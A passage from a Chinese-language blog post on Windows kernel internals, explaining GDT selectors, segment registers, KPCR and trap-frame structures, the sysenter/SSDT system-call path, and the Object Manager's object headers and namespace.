class="headerlink" title="GDT全局描述表（Global Description Table）"></a>GDT全局描述表（Global Description Table）</h4><p>在 x86 保护模式 (Protected Mode) 下，内存不再是直接通过物理地址访问，而是通过 “分段 (Segmentation)” 机制访问。</p><ol><li>不直接给地址 ：当程序执行 <code>mov eax, [0x12345678]</code> 时，CPU 并不是直接去物理内存的 <code>0x12345678</code> 拿数据。</li><li>段选择子 (Selector) ：CPU 会先看当前段寄存器（如 <code>DS</code>、<code>CS</code>、<code>SS</code>）里存的  “索引号” （即选择子）。</li><li>查表 (Lookup) ：CPU 根据这个索引号，去 GDT 表里找到对应的  “段描述符 (Descriptor)” 。</li><li>鉴权与定位 ：描述符里记录了这段内存的  基地址 (Base) 、大小 (Limit) 和  权限 (Access Rights) 。只有检查通过，CPU 才会把 基地址 + 偏移量 算出线性地址。</li></ol><table><thead><tr><th>索引 (Index)</th><th>选择子 (Selector)</th><th>名称</th><th>DPL (特权级)</th><th>用途与特征</th></tr></thead><tbody><tr><td>0</td><td>0x00</td><td>NULL</td><td>-</td><td>空描述符 。硬件规定，不可使用。</td></tr><tr><td>1</td><td>0x08</td><td>KGDT_R0_CODE</td><td>0 (内核)</td><td>内核代码段 。Base&#x3D;0, Limit&#x3D;4GB。内核执行代码时 CS&#x3D;0x08。</td></tr><tr><td>2</td><td>0x10</td><td>KGDT_R0_DATA</td><td>0 (内核)</td><td>内核数据段 。Base&#x3D;0, Limit&#x3D;4GB。内核读写数据时 DS&#x2F;ES&#x2F;SS&#x3D;0x10。</td></tr><tr><td>3</td><td>0x1B</td><td>KGDT_R3_CODE</td><td>3 (用户)</td><td>用户代码段 。Base&#x3D;0, Limit&#x3D;4GB。用户程序运行时 CS&#x3D;0x1B (0x18</td></tr><tr><td>4</td><td>0x23</td><td>KGDT_R3_DATA</td><td>3 (用户)</td><td>用户数据段 。Base&#x3D;0, Limit&#x3D;4GB。用户程序运行时 DS&#x2F;ES&#x2F;SS&#x3D;0x23 (0x20</td></tr><tr><td>5</td><td>0x28</td><td>KGDT_TSS</td><td>0 (内核)</td><td>TSS (任务状态段) 。用于保存硬件上下文和栈切换信息 (ESP0)。</td></tr><tr><td>6</td><td>0x30</td><td>KGDT_R0_PCR</td><td>0 (内核)</td><td>内核 KPCR 指针 。 这是唯一的非平坦段 。Base&#x3D;KPCR地址。内核通过 FS 访问 CPU 专属数据。</td></tr><tr><td>7</td><td>0x3B</td><td>KGDT_R3_TEB</td><td>3 (用户)</td><td>用户 TEB 指针 。Base&#x3D;当前线程TEB地址。用户通过 FS 访问线程局部存储。</td></tr><tr><td>…</td><td>…</td><td>…</td><td>…</td><td>(其他保留项，如 LDT, VDM 等)</td></tr></tbody></table><p>LDT：局部描述表（Local Description Table），与GDT功能一致，但不能单独存在，只能嵌套在GDT中。</p><h4 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h4><p>CS (Code Segment) —— 必须指向代码</p><p>CPU 的取指单元（Instruction Fetch Unit）永远只从 <code>CS:EIP</code>（或 <code>CS:RIP</code>）指向的地址读取指令。CS 寄存器的低 2 位（CPL）代表了当前 CPU 的特权级（Ring 0 - Ring 3）。CS 指向 Ring 0 代码段 (0x08) 或 Ring 3 代码段 (0x1B)。</p><p>SS (Stack Segment) —— 必须指向堆栈</p><p>所有的隐式堆栈操作（如 <code>push</code>, <code>pop</code>, <code>call</code>, <code>ret</code>, <code>enter</code>, <code>leave</code>）以及基于 <code>ESP</code>&#x2F;<code>EBP</code> 的内存访问，默认使用 SS 段。SS 指向内核栈段 (0x10) 或用户栈段 (0x23)。</p><p>DS (Data Segment) &amp; ES (Extra Segment)</p><p>DS 是数据访问的默认段（例如 <code>mov eax, [ebx]</code> 默认就是 <code>ds:[ebx]</code>）。ES 是字符串指令（如 <code>movs</code>, <code>stos</code>）的目标段默认值。</p><p>FS &amp; GS (F-Segment &#x2F; G-Segment)</p><table><thead><tr><th>架构</th><th>FS 寄存器用途</th><th>GS 寄存器用途</th><th>为什么不同？</th></tr></thead><tbody><tr><td>x86 (32位)</td><td>指向 TEB (R3) &#x2F; KPCR (R0)</td><td>未大量使用 (通常为0)</td><td>x86下 FS 选择子很早就被分配给了 TEB&#x2F;PCR。</td></tr><tr><td>x64 (64位)</td><td>(兼容性保留，指向 32位TEB)</td><td>指向 TEB (R3) &#x2F; KPCR (R0)</td><td>x64下 CPU 允许 <code>swapgs</code>快速切换 GS，所以主要用 GS。</td></tr></tbody></table><p>fs:[0]：在3环时，该处指向的是TEB结构，0环下指向_KPCR结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">KPCR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> <span class="title">NtTib</span>;</span>                                               <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>* <span class="title">Used_ExceptionList</span>;</span>      <span class="comment">//0x0</span></span><br><span class="line">            VOID* Used_StackBase;                                           <span class="comment">//0x4</span></span><br><span class="line">            VOID* Spare2;                                                   <span class="comment">//0x8</span></span><br><span class="line">            VOID* TssCopy;                                                  <span class="comment">//0xc</span></span><br><span class="line">            ULONG ContextSwitches;                                          <span class="comment">//0x10</span></span><br><span class="line">            ULONG SetMemberCopy;                                            <span class="comment">//0x14</span></span><br><span class="line">            VOID* Used_Self;                                                <span class="comment">//0x18</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KPCR</span>* <span class="title">SelfPcr</span>;</span>                                                  <span class="comment">//0x1c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KPRCB</span>* <span class="title">Prcb</span>;</span>                                                    <span class="comment">//0x20</span></span><br><span class="line">    UCHAR Irql;                                                             <span class="comment">//0x24</span></span><br><span class="line">    ULONG IRR;                                                              <span class="comment">//0x28</span></span><br><span class="line">    ULONG IrrActive;                                                        <span class="comment">//0x2c</span></span><br><span class="line">    ULONG IDR;                                                              <span class="comment">//0x30</span></span><br><span class="line">    VOID* KdVersionBlock;                                                   <span class="comment">//0x34</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KIDTENTRY</span>* <span class="title">IDT</span>;</span>                                                 <span class="comment">//0x38</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KGDTENTRY</span>* <span class="title">GDT</span>;</span>                                                 <span class="comment">//0x3c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KTSS</span>* <span class="title">TSS</span>;</span>                                                      <span class="comment">//0x40</span></span><br><span class="line">    USHORT MajorVersion;                                                    <span class="comment">//0x44</span></span><br><span class="line">    USHORT MinorVersion;                                                    <span class="comment">//0x46</span></span><br><span class="line">    ULONG SetMember;                                                        <span class="comment">//0x48</span></span><br><span class="line">    ULONG StallScaleFactor;                                                 <span class="comment">//0x4c</span></span><br><span class="line">    UCHAR SpareUnused;                                                      <span class="comment">//0x50</span></span><br><span class="line">    UCHAR Number;                                                           <span class="comment">//0x51</span></span><br><span class="line">    UCHAR Spare0;                                                           <span class="comment">//0x52</span></span><br><span class="line">    UCHAR SecondLevelCacheAssociativity;                                    <span class="comment">//0x53</span></span><br><span class="line">    ULONG VdmAlert;                                                         <span class="comment">//0x54</span></span><br><span class="line">    ULONG KernelReserved[<span class="number">14</span>];                                               <span class="comment">//0x58</span></span><br><span class="line">    ULONG SecondLevelCacheSize;                                             <span class="comment">//0x90</span></span><br><span class="line">    ULONG HalReserved[<span class="number">16</span>];                                                  <span class="comment">//0x94</span></span><br><span class="line">    ULONG InterruptMode;                                                    <span class="comment">//0xd4</span></span><br><span class="line">    UCHAR Spare1;                                                           <span class="comment">//0xd8</span></span><br><span class="line">    ULONG KernelReserved2[<span class="number">17</span>];                                              <span class="comment">//0xdc</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KPRCB</span> <span class="title">PrcbData</span>;</span>                                                 <span class="comment">//0x120</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p> <code>mov ecx, fs:_KPCR.TSS</code>：通过 FS (KPCR) 获取当前任务状态段 (TSS)。</p><p><code>mov esp, [ecx+_KTSS.Esp0]</code>：栈指针切换到该线程真正的内核栈顶</p><p>后续是根据 <code>KTrap_Frame</code>的结构构建完整 <code>Trap Frame</code> 与异常链表，需要注意的是用户态的 <code>esp</code>是通过 <code>push edx</code>来压入的，因为 <code>sysenter</code>被封装成了 <code>KiFastSystemCall</code>函数，会先进行 <code>mov edx,esp;</code>然后再 <code>sysenter</code>，eip则是 <code>_KUSER_SHARED_DATA</code>中的 <code>SystemCallReturn</code> 地址</p><p><code>mov ebx, large fs:KPCR.SelfPcr</code>：获取 PCR 指针，<code>push dword ptr [ebx]</code>：保存当前的异常处理链表头 (<code>PCR.ExceptionList</code>) 到栈</p><p>最后保存到_KTHREAD.TrapFrame中</p><p>KTrap_Frame：栈帧，用来保存R3切换到R0的环境</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8c bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">KTRAP_FRAME</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG DbgEbp;                                                           <span class="comment">//0x0</span></span><br><span class="line">    ULONG DbgEip;                                                           <span class="comment">//0x4</span></span><br><span class="line">    ULONG DbgArgMark;                                                       <span class="comment">//0x8</span></span><br><span class="line">    ULONG DbgArgPointer;                                                    <span class="comment">//0xc</span></span><br><span class="line">    USHORT TempSegCs;                                                       <span class="comment">//0x10</span></span><br><span class="line">    UCHAR Logging;                                                          <span class="comment">//0x12</span></span><br><span class="line">    UCHAR Reserved;                                                         <span class="comment">//0x13</span></span><br><span class="line">    ULONG TempEsp;                                                          <span class="comment">//0x14</span></span><br><span class="line">    ULONG Dr0;                                                              <span class="comment">//0x18</span></span><br><span class="line">    ULONG Dr1;                                                              <span class="comment">//0x1c</span></span><br><span class="line">    ULONG Dr2;                                                              <span class="comment">//0x20</span></span><br><span class="line">    ULONG Dr3;                                                              <span class="comment">//0x24</span></span><br><span class="line">    ULONG Dr6;                                                              <span class="comment">//0x28</span></span><br><span class="line">    ULONG Dr7;                                                              <span class="comment">//0x2c</span></span><br><span class="line">    ULONG SegGs;                                                            <span class="comment">//0x30</span></span><br><span class="line">    ULONG SegEs;                                                            <span class="comment">//0x34</span></span><br><span class="line">    ULONG SegDs;                                                            <span class="comment">//0x38</span></span><br><span class="line">    ULONG Edx;                                                              <span class="comment">//0x3c</span></span><br><span class="line">    ULONG Ecx;                                                              <span class="comment">//0x40</span></span><br><span class="line">    ULONG Eax;                                                              <span class="comment">//0x44</span></span><br><span class="line">    ULONG PreviousPreviousMode;                                             <span class="comment">//0x48-----R0用</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>* <span class="title">ExceptionList</span>;</span>                   <span class="comment">//0x4c</span></span><br><span class="line">    ULONG SegFs;                                                            <span class="comment">//0x50</span></span><br><span class="line">    ULONG Edi;                                                              <span class="comment">//0x54</span></span><br><span class="line">    ULONG Esi;                                                              <span class="comment">//0x58</span></span><br><span class="line">    ULONG Ebx;                                                              <span class="comment">//0x5c</span></span><br><span class="line">    ULONG Ebp;                                                              <span class="comment">//0x60</span></span><br><span class="line">    ULONG ErrCode;                                                          <span class="comment">//0x64</span></span><br><span class="line">    ULONG Eip;                                                              <span class="comment">//0x68</span></span><br><span class="line">    ULONG SegCs;                                                            <span class="comment">//0x6c </span></span><br><span class="line">    ULONG EFlags;                                                           <span class="comment">//0x70-----R3用</span></span><br><span class="line">    ULONG HardwareEsp;                                                      <span class="comment">//0x74 </span></span><br><span class="line">    ULONG HardwareSegSs;                                                    <span class="comment">//0x78</span></span><br><span class="line">    ULONG V86Es;                                                            <span class="comment">//0x7c虚拟8086模式下，保护模式下不用</span></span><br><span class="line">    ULONG V86Ds;                                                            <span class="comment">//0x80</span></span><br><span class="line">    ULONG V86Fs;                                                            <span class="comment">//0x84</span></span><br><span class="line">    ULONG V86Gs;                                                            <span class="comment">//0x88</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>确定系统服务表（SSDT vs Shadow SSDT）</p><p><code>mov edi, eax</code> &#x2F; <code>shr edi, 8</code> &#x2F; <code>and edi, 10h</code></p><p>Windows 系统调用号第 12 位（bit 12）用于区分表。</p><ul><li>如果 ID &lt; 0x1000，<code>edi</code> 结果为 0 -&gt; 使用 KeServiceDescriptorTable (核心内核函数)。</li><li>如果 ID &gt;&#x3D; 0x1000 (如 0x1xxx)，<code>edi</code> 结果为 0x10 -&gt; 使用 KeServiceDescriptorTableShadow (win32k.sys 图形&#x2F;窗口函数)。</li></ul><p><code>add edi, [esi+_KTHREAD.ServiceTable]</code> _KTHREAD中有服务表的基址，现在edi指向了正确的 Service Descriptor Table 结构体</p><p>获取 SSDT 参数表 (Argument Table) 的基址，获取 SSDT 函数地址表 (Service Table) 的基址。</p><p>从参数表中读取该系统调用需要的参数字节数 ，从函数表中读取目标内核函数地址 —-计算公式：表基址 + (调用号 * 4)。</p><p>通过 <code>rep movsd</code>从用户态堆栈完整拷贝到内核态堆栈（此时ECX–参数个数；ESI–由EDX赋予，EDX在sysenter前就指向old esp；   EDI–内核栈地址），最后 <code>call ebx</code>调用内核函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLKSERVICE_TABLE_DESCRIPTORE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PULONG_PTR FuncPoint;<span class="comment">//指向函数表</span></span><br><span class="line">    PULONG Count;<span class="comment">//调用的次数</span></span><br><span class="line">    PULONG Limit;<span class="comment">//函数个数</span></span><br><span class="line">    PUCHAR ArgsPoint;<span class="comment">//参数列表</span></span><br><span class="line">&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUMBER_SERVICE_TABLES 2</span></span><br><span class="line"> </span><br><span class="line">KSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable[NUMBER_SERVICE_TABLES]</span><br><span class="line">KSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTableShadow[NUMBER_SERVICE_TABLES]</span><br></pre></td></tr></table></figure><p><img src="/image/2025-12-30-learning_windows_4/1767091367705.png" alt="1767091367705"></p><p>x64下 <code>syscall</code>似乎和x86下的 <code>sysenter</code>差不多，跳转的内核函数是 <code>KiSystemCall64</code></p><h3 id="x86下R0-R3"><a href="#x86下R0-R3" class="headerlink" title="x86下R0-&gt;R3"></a>x86下R0-&gt;R3</h3><p>处理APC：代码读取 <code>KPCR-&gt;CurrentThread</code> (<code>fs:124h</code>)</p><p>检查 <code>Thread-&gt;ApcState.UserApcPending</code>，如果有用户态的 APC（比如某些 I&#x2F;O 完成回调、线程挂起请求）， 需要先处理掉（APC注入的发生点）<code>call _KiDeliverApc</code>直到所有挂起的 APC都执行完毕。</p><p>恢复异常链表及调试寄存器（如果为调试模式的话）：从 TrapFrame 中取出用户态的 <code>ExceptionList</code>，写回 <code>fs:[0]</code> (KPCR的第一个成员指向TEB )，</p><p>检查 <code>TrapFrame-&gt;Dr7</code>。如果用户态程序下了硬件断点（Hardware Breakpoint），这里需要恢复调试寄存器 <code>DR0</code>-<code>DR7</code>。</p><p>恢复通用寄存器与栈调整，将ESP移动到TrapFrame-&gt;SegFs，<code>pop fs</code>恢复3环FS，再移动esp恢复各个通用寄存器，执行iret返回用户态自动从栈上弹出 EIP, CS, EFLAGS, ESP, SS</p><h2 id="对象管理"><a href="#对象管理" class="headerlink" title="对象管理"></a>对象管理</h2><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>内存模型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[ Optional Headers (Name, Creator, etc.) ]</span><br><span class="line">[ _OBJECT_HEADER ]  &lt;--- 核心元数据 (引用计数, TypeIndex 等)</span><br><span class="line">[ Object Body ]     &lt;--- 外部指针指向这里 (e.g., _EPROCESS, _FILE_OBJECT等)</span><br><span class="line"></span><br><span class="line">|---------------------------|</span><br><span class="line">| POOL_HEADER               |  内存池头部</span><br><span class="line">|---------------------------|</span><br><span class="line">| OBJECT_HEADER_NAME_INFO   |  名字信息 (可选)</span><br><span class="line">|---------------------------|</span><br><span class="line">| OBJECT_HEADER_HANDLE_INFO |  句柄信息 (可选)</span><br><span class="line">|---------------------------|</span><br><span class="line">| OBJECT_HEADER_QUOTA_INFO  |  配额信息 (可选)</span><br><span class="line">|---------------------------|</span><br><span class="line">| OBJECT_HEADER             |  内核对象统一头部 (必定存在)</span><br><span class="line">|---------------------------|</span><br><span class="line">| OBJECT_BODY               |  对象体结构 (如 DRIVER_OBJECT)</span><br><span class="line">|---------------------------|</span><br></pre></td></tr></table></figure><p>附加信息头是可选的，它包括了以下信息头的一个或多个</p><table><thead><tr><th><strong>名称</strong></th><th><strong>结构</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>创建信息头</td><td>OBJECT_HEADER_CREATOR_INFO</td><td>包含创建者信息，用来将创建的对象挂入其创建者的对象队列</td></tr><tr><td>命名信息头</td><td>OBJECT_HEADER_NAME_INFO</td><td>载有对象名和目录节点的指针</td></tr><tr><td>句柄信息头</td><td>OBJECT_HEADER_HANDLE_INFO</td><td>关于句柄的信息</td></tr><tr><td>配额信息头</td><td>OBJECT_HEADER_QUOTA_INFO</td><td>关于耗用内存配额的信息</td></tr></tbody></table><h4 id="OBJECT-HEADER"><a href="#OBJECT-HEADER" class="headerlink" title="_OBJECT_HEADER"></a>_OBJECT_HEADER</h4><p>x64 Win10 下通常为 0x30</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">6: kd&gt; dt nt!_OBJECT_HEADER</span><br><span class="line">   +0x000 PointerCount     : Int8B         //指针引用计数,当内核组件通过指针引用对象时增加,当降为0时,对象内存被释放。初始化为 1</span><br><span class="line">   +0x008 HandleCount      : Int8B         //句柄引用计数,用户模式或内核模式打开的Handle数量。</span><br><span class="line">   +0x008 NextToFree       : Ptr64 Void</span><br><span class="line">   +0x010 Lock             : _EX_PUSH_LOCK</span><br><span class="line">   +0x018 TypeIndex        : UChar         //索引，用于在全局类型数组中找到该对象的_OBJECT_TYPE。</span><br><span class="line">   +0x019 TraceFlags       : UChar </span><br><span class="line">   +0x019 DbgRefTrace      : Pos 0, 1 Bit</span><br><span class="line">   +0x019 DbgTracePermanent : Pos 1, 1 Bit</span><br><span class="line">   +0x01a InfoMask         : UChar         //标记是否有 Name/Handle/Quota 这三种可选头</span><br><span class="line">   +0x01b Flags            : UChar</span><br><span class="line">   +0x01b NewObject        : Pos 0, 1 Bit</span><br><span class="line">   +0x01b KernelObject     : Pos 1, 1 Bit</span><br><span class="line">   +0x01b KernelOnlyAccess : Pos 2, 1 Bit</span><br><span class="line">   +0x01b ExclusiveObject  : Pos 3, 1 Bit</span><br><span class="line">   +0x01b PermanentObject  : Pos 4, 1 Bit</span><br><span class="line">   +0x01b DefaultSecurityQuota : Pos 5, 1 Bit</span><br><span class="line">   +0x01b SingleHandleEntry : Pos 6, 1 Bit</span><br><span class="line">   +0x01b DeletedInline    : Pos 7, 1 Bit</span><br><span class="line">   +0x01c Reserved         : Uint4B</span><br><span class="line">   +0x020 ObjectCreateInfo : Ptr64 _OBJECT_CREATE_INFORMATION</span><br><span class="line">   +0x020 QuotaBlockCharged : Ptr64 Void</span><br><span class="line">   +0x028 SecurityDescriptor : Ptr64 Void</span><br><span class="line">   +0x030 Body             : _QUAD</span><br></pre></td></tr></table></figure><h4 id="OBJECT-TYPE"><a href="#OBJECT-TYPE" class="headerlink" title="_OBJECT_TYPE"></a>_OBJECT_TYPE</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">6: kd&gt; dt nt!_OBJECT_TYPE</span><br><span class="line">   +0x000 TypeList         : _LIST_ENTRY    // 链接所有 OBJECT_TYPE 实例</span><br><span class="line">   +0x010 Name             : _UNICODE_STRING</span><br><span class="line">   +0x020 DefaultObject    : Ptr64 Void  </span><br><span class="line">   +0x028 Index            : UChar        // 对象类型索引</span><br><span class="line">   +0x02c TotalNumberOfObjects : Uint4B   // 当前该类型对象的总数</span><br><span class="line">   +0x030 TotalNumberOfHandles : Uint4B   // 该类型所有对象的句柄总数</span><br><span class="line">   +0x034 HighWaterNumberOfObjects : Uint4B</span><br><span class="line">   +0x038 HighWaterNumberOfHandles : Uint4B</span><br><span class="line">   +0x040 TypeInfo         : _OBJECT_TYPE_INITIALIZER  // 类型初始化结构，定义该类型对象的行为（如回调、池分配方式等）</span><br><span class="line">   +0x0b8 TypeLock         : _EX_PUSH_LOCK </span><br><span class="line">   +0x0c0 Key              : Uint4B</span><br><span class="line">   +0x0c8 CallbackList     : _LIST_ENTRY  //📌对象回调链表，用于支持注册的 ObRegisterCallbacks 回调</span><br></pre></td></tr></table></figure><h4 id="ObCreateObject-ObjectAttributes-size-ObjectType"><a href="#ObCreateObject-ObjectAttributes-size-ObjectType" class="headerlink" title="ObCreateObject(ObjectAttributes,size,ObjectType)"></a>ObCreateObject(ObjectAttributes,size,ObjectType)</h4><ol><li>Capture (捕获) : 解析 <code>ObjectAttributes</code>，提取名字、安全描述符，暂存到 <code>OBJECT_CREATE_INFORMATION</code> 结构（通常利用 Lookaside List 优化，不直接分配堆）。</li><li>Calculate (计算) :<code>TotalSize = BodySize + sizeof(FixedHeader) + sizeof(OptionalHeaders) + Padding</code>。</li><li>Allocate (分配) :调用 <code>ExAllocatePoolWithTag</code>。<ul><li>Tag : 取自 <code>ObjectType-&gt;Key</code>。</li><li>Ptr : 拿到堆块首地址 <code>pChunk</code>。</li></ul></li><li>Format (格式化) :<ul><li>根据计算好的偏移，定位到 <code>FixedHeader</code> 的位置。</li><li>填充 <code>FixedHeader</code> (写入 <code>InfoMask</code>, <code>TypeIndex</code>)。</li><li>如果存在 Optional Headers，将名字、配额指针填入 Header 前面的内存区域。</li></ul></li><li>Return (返回) :<br>返回指向 Body 的指针。</li></ol><p>假设创建了一个带名字、带安全描述符的 Event 对象。最终内存里长这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[ 内存低地址 ]</span><br><span class="line">|</span><br><span class="line">|   &lt;--- ExAllocatePoolWithTag 返回的起始地址 (pChunk)</span><br><span class="line">|</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| Optional Header: _OBJECT_HEADER_QUOTA_INFO            | </span><br><span class="line">| (存在是因为带了SD需要计费)                              |</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| Optional Header: _OBJECT_HEADER_NAME_INFO             |</span><br><span class="line">| .Name      -&gt; 指向分页池中存放 &quot;MyEvent&quot; 字符串的地址     |</span><br><span class="line">| .Directory -&gt; 指向 &quot;\BaseNamedObjects&quot; 目录对象的指针    |</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| padding (对齐填充)                                     |</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| Fixed Header: _OBJECT_HEADER                          | &lt;--- 通过 Body - 0x30 访问</span><br><span class="line">| .PointerCount = 1                                     |</span><br><span class="line">| .InfoMask     = 0x0A (0x08 Quota | 0x02 Name)         |</span><br><span class="line">| .TypeIndex    = EventTypeIndex                        |</span><br><span class="line">| .SecurityDescriptor -&gt; 指向安全描述符的指针              |</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| Object Body: _KEVENT                                  | </span><br><span class="line">| .Header (Dispatcher Header)                           |</span><br><span class="line">| .SignalState                                          |</span><br><span class="line">| ...                                                   |</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">|</span><br><span class="line">[ 内存高地址 ]</span><br></pre></td></tr></table></figure><h3 id="对象命名空间"><a href="#对象命名空间" class="headerlink" title="对象命名空间"></a>对象命名空间</h3><p>Object Manager 命名空间是 Windows 内核中统一管理一切内核对象的“对象目录树”，本质上是一个分层的哈希表结构。</p><h4 id="OBJECT-DIRECTORY"><a href="#OBJECT-DIRECTORY" class="headerlink" title="OBJECT_DIRECTORY"></a>OBJECT_DIRECTORY</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_OBJECT_DIRECTORY</span><br><span class="line">   +0x000 HashBuckets      : [37] Ptr64 _OBJECT_DIRECTORY_ENTRY  //指针数组,每个指向一个 _OBJECT_DIRECTORY_ENTRY 链表</span><br><span class="line">   +0x128 Lock             : _EX_PUSH_LOCK</span><br><span class="line">   +0x130 DeviceMap        : Ptr64 _DEVICE_MAP</span><br><span class="line">   +0x138 ShadowDirectory  : Ptr64 _OBJECT_DIRECTORY</span><br><span class="line">   +0x140 NamespaceEntry   : Ptr64 Void</span><br><span class="line">   +0x148 SessionObject    : 